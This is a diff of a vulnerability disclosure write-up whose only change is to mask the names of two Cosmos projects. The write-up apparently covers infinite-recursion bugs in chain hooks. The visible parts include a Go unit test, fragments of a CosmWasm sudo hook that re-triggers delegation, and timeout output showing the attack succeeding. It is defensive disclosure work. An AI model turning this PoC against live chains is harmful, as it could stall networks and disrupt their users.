@@ -7,12 +7,12 @@
 | # | Project | PoC Type | Issue Reference |
 |---|---------|----------|-----------------|
 | 9 | [Mantra](https://github.com/MANTRA-Chain/mantrachain) | UnitTest | [cosmos-sdk#25303](https://github.com/cosmos/cosmos-sdk/pull/25303) |
-| 10 | [Neutron](https://github.com/neutron-org/neutron) | UnitTest | [neutron#978](https://github.com/neutron-org/neutron/pull/978) |
+| 10 | [n***](https://github.com/n***-org/n***) | UnitTest | [n***#978](https://github.com/n***-org/n***/pull/978) |
 | 11 | [Tower](https://github.com/quasar-finance/quasar) | UnitTest | [before_send.go#L161](https://github.com/quasar-finance/quasar/blob/main/x/tokenfactory/keeper/before_send.go#L161) |
 | 12 | [Phoenix](https://github.com/phoenix-directive/core) | UnitTest | [before_send.go#L144](https://github.com/jmesworld/core/blob/main/x/tokenfactory/keeper/before_send.go#L144) |
 | 13 | [JMES](https://github.com/jmesworld/core) | UnitTest | [before_send.go#L144](https://github.com/jmesworld/core/blob/main/x/tokenfactory/keeper/before_send.go#L144) |
 | 14 | [Symphony](https://github.com/Orchestra-Labs/symphony) | UnitTest | [before_send.go#L165](https://github.com/Orchestra-Labs/symphony/blob/main/x/tokenfactory/keeper/before_send.go#L165) |
-| 15 | [Juno](https://github.com/CosmosContracts/juno) | Mock | [contracts.go#L70-L87](https://github.com/CosmosContracts/juno/blob/main/x/cw-hooks/keeper/contracts.go#L70-L87) |
+| 15 | [j***](https://github.com/CosmosContracts/j***) | Mock | [contracts.go#L70-L87](https://github.com/CosmosContracts/j***/blob/main/x/cw-hooks/keeper/contracts.go#L70-L87) |
 
 ---
 
@@ -30,20 +30,20 @@
 ## PoC
 
 
-### PoC #9–#14: TokenFactory (Mantra, Neutron, Tower, Phoenix, JMES, Symphony)
+### PoC #9–#14: TokenFactory (Mantra, n***, Tower, Phoenix, JMES, Symphony)
 
 see [mantra-case](../../high-light-findings/mantra-tokenfactory/)
 
 
-### PoC #15: Juno
+### PoC #15: j***
 
-**1. Add Below Test to juno project** 
+**1. Add Below Test to j*** project** 
 Add below test to cwhook `x/auth/keeper/msg_server_test.go`
 ```go
 func (s *KeeperTestSuite) TestContractExecution() {
 	s.SetupTest()
 	_, _, sender := testdata.KeyTestPubAddr()
-	coin := sdk.NewCoins(sdk.NewCoin("stake", sdkmath.NewInt(1000000000000000000)), sdk.NewCoin("ujuno", sdkmath.NewInt(1000000000000000000)))
+	coin := sdk.NewCoins(sdk.NewCoin("stake", sdkmath.NewInt(1000000000000000000)), sdk.NewCoin("uj***", sdkmath.NewInt(1000000000000000000)))
 	s.FundAcc(sender, coin)
 	wasmCode, err := os.ReadFile("...wasm")//use the wasm path you compiled in below poc contract!
 	contractAddress := s.InstantiateContract(sender.String(), "", wasmCode)
@@ -55,7 +55,7 @@ func (s *KeeperTestSuite) TestContractExecution() {
 		ContractAddress: contractAddress,
 		RegisterAddress: sender.String(),
 	})
-	coin2 := sdk.NewCoins(sdk.NewCoin("stake", sdkmath.NewInt(1000000000000000000)), sdk.NewCoin("ujuno", sdkmath.NewInt(1000000000000000000)))
+	coin2 := sdk.NewCoins(sdk.NewCoin("stake", sdkmath.NewInt(1000000000000000000)), sdk.NewCoin("uj***", sdkmath.NewInt(1000000000000000000)))
 	addr2, err := sdk.AccAddressFromBech32(contractAddress)
 	s.FundAcc(addr2, coin2)
 	s.Require().NoError(err)
@@ -149,7 +149,7 @@ pub fn sudo(deps: DepsMut, _env: Env, msg: SudoMsg) -> Result<Response, Contract
     match msg {
         SudoMsg::AfterDelegationModified(del) => {
             let delegate_amount = Coin {
-                denom: "ujuno".to_string(),
+                denom: "uj***".to_string(),
                 amount: Uint128::new(1),
             };
             let cosmos_msg1 = CosmosMsg::Staking(StakingMsg::Delegate {
@@ -171,7 +171,7 @@ pub fn sudo(deps: DepsMut, _env: Env, msg: SudoMsg) -> Result<Response, Contract
 This means that the attack has been successful as the transaction will be Infinit executed. Because there is a loop call greater than 2^500 times.
 
 ```bash
-Running tool: /opt/homebrew/opt/go@1.22/bin/go test -timeout 30s -run ^TestKeeperTestSuite$ -testify.m ^(TestContractExecution)$ github.com/CosmosContracts/juno/v29/x/cw-hooks/keeper -tags=test
+Running tool: /opt/homebrew/opt/go@1.22/bin/go test -timeout 30s -run ^TestKeeperTestSuite$ -testify.m ^(TestContractExecution)$ github.com/CosmosContracts/j***/v29/x/cw-hooks/keeper -tags=test
 
 panic: test timed out after 30s
 	running tests:
